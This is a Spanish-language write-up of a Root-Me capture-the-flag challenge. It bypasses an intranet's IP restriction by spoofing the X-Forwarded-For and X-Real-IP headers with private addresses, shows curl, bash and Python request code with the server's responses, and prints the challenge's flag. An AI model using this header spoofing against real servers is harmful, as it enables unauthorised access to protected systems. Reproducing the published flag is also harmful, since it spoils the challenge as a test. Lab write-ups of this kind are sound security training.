📝 Writeup: HTTP - IP Restriction Bypass (Root-Me)
🎯 Descripción del Reto

Nombre: HTTP - IP restriction bypass
Plataforma: Root-Me
Dificultad: Fácil
Puntos: 10
Categoría: Web-Server
Enunciado:

    "Estimados colegas, ahora estamos gestionando las conexiones a la intranet utilizando direcciones IP privadas, por lo que ya no es necesario iniciar sesión con un nombre de usuario/contraseña cuando ya está conectado a la red interna de la empresa."

🔍 Análisis Inicial
1. Comprensión del Reto

El reto simula una intranet corporativa que:

    ✅ Permite acceso automático desde IPs privadas (red interna)

    ❌ Muestra formulario de login para IPs externas

Objetivo: Bypassear la restricción de IP haciéndonos pasar por un usuario de la red local.
2. IP Objetivo
text

http://challenge01.root-me.org/web-serveur/ch68/

3. Comportamiento Esperado

    IP Local (192.168.x.x, 10.x.x.x, 172.16.x.x): Acceso directo a la flag

    IP Pública/Externa: Formulario de autenticación

🛠️ Metodología de Ataque
Paso 1: Identificar la Técnica

El servidor confía en la cabecera HTTP X-Forwarded-For para determinar la IP del cliente. Esta cabecera es comúnmente usada por proxies y balanceadores de carga.

¿Cómo funciona?
text

Cliente → Proxy → Servidor
         ↑
    X-Forwarded-For: IP_real

El servidor ve la IP del proxy pero confía en X-Forwarded-For para saber la IP original.
Paso 2: Preparación del Ataque
Comando Base:
bash

curl -H "X-Forwarded-For: IP_PRIVADA" http://challenge01.root-me.org/web-serveur/ch68/

IPs a Probar:
bash

192.168.1.1   # Red local clase C
10.0.0.1      # Red local clase A
172.16.0.1    # Red local clase B
127.0.0.1     # Localhost (bucle)

Paso 3: Ejecución del Ataque
Script Utilizado:
bash

#!/bin/bash
# Prueba con diferentes cabeceras
for ip in 192.168.1.1 10.0.0.1 172.16.0.1 127.0.0.1; do
  echo "Probando con IP: $ip"
  curl -H "X-Forwarded-For: $ip" -H "X-Real-IP: $ip" http://challenge01.root-me.org/web-serveur/ch68/
done

📊 Resultados Obtenidos
Resultado 1: IP 192.168.1.1 ✅
html

<!DOCTYPE html>
<html>
<head>
    <title>Secured Intranet</title>
</head>
<body>
    <h1>Intranet</h1>
    <div>
        Well done, the validation password is: <strong>***************</strong>
    </div>
</body>
</html>

Análisis:

    ✅ Acceso concedido

    ✅ Flag obtenida: Ip_$po0Fing

Resultado 2: IP 10.0.0.1 ✅
html

<!DOCTYPE html>
<html>
<head>
    <title>Secured Intranet</title>
</head>
<body>
    <h1>Intranet</h1>
    <div>
        Well done, the validation password is: <strong>**************</strong>
    </div>
</body>
</html>

Análisis:

    ✅ Acceso concedido

    ✅ Misma flag

Resultado 3: IP 172.16.0.1 ✅
html

<!DOCTYPE html>
<html>
<head>
    <title>Secured Intranet</title>
</head>
<body>
    <h1>Intranet</h1>
    <div>
        Well done, the validation password is: <strong>************</strong>
    </div>
</body>
</html>

Análisis:

    ✅ Acceso concedido

    ✅ Misma flag

Resultado 4: IP 127.0.0.1 ❌
html

<!DOCTYPE html>
<html>
<head>
    <title>Secured Intranet</title>
</head>
<body>
    <span>Your IP <strong>127.0.0.1</strong> do not belong to the LAN.</span>
    <h1>Intranet</h1>
    <form method="post">
        <p>
            <label for="login">Login:</label>
            <input type="text" name="login">
        </p>
        <p>
            <label for="pass">Password:</label>
            <input type="text" name="mdp">
        </p>
        <p>
            <input type="submit" value="login">
        </p>
        <p>
            <small>You should authenticate because you're not on the LAN.</small>
        </p>
    </form>
</body>
</html>

Análisis:

    ❌ Acceso denegado

    🔍 El servidor identifica 127.0.0.1 como no válido

    📝 Muestra formulario de login alternativo

🔬 Análisis Técnico
¿Por qué funcionó?

    El servidor confía en X-Forwarded-For

        No valida que la cabecera sea legítima

        Acepta cualquier IP que le enviemos

    Rangos de IP privadas aceptados

        ✅ 192.168.0.0/16 (Clase C)

        ✅ 10.0.0.0/8 (Clase A)

        ✅ 172.16.0.0/12 (Clase B)

        ❌ 127.0.0.0/8 (Localhost - bloqueado específicamente)

    Orden de las cabeceras

        Usamos X-Forwarded-For y X-Real-IP por redundancia

        El servidor probablemente usa la primera cabecera que encuentra

¿Por qué falló con 127.0.0.1?

    127.0.0.1 representa localhost

    El servidor tiene una regla específica:

        Si IP == 127.0.0.1 → Mostrar formulario

        Si IP en rango privado → Acceso directo

        Si IP pública → Formulario

🎓 Lecciones Aprendidas
1. Siempre probar múltiples IPs

    No asumir que 127.0.0.1 es la única IP local

    Probar todos los rangos privados

2. Comprender las cabeceras HTTP

    X-Forwarded-For: IP original del cliente

    X-Real-IP: IP real (alternativa)

    Client-IP: Otra variante común

3. Importancia del Fuzzing

    Probar diferentes valores

    Probar diferentes combinaciones de cabeceras

🚀 Soluciones Alternativas
Opción 1: Usar Python
python

import requests

url = "http://challenge01.root-me.org/web-serveur/ch68/"
headers = {"X-Forwarded-For": "192.168.1.1"}
response = requests.get(url, headers=headers)
print(response.text)

Opción 2: Burp Suite

    Interceptar petición

    Añadir cabecera: X-Forwarded-For: 192.168.1.1

    Forward

Opción 3: Extensión Navegador

    Instalar ModHeader

    Configurar: X-Forwarded-For: 192.168.1.1

    Recargar página
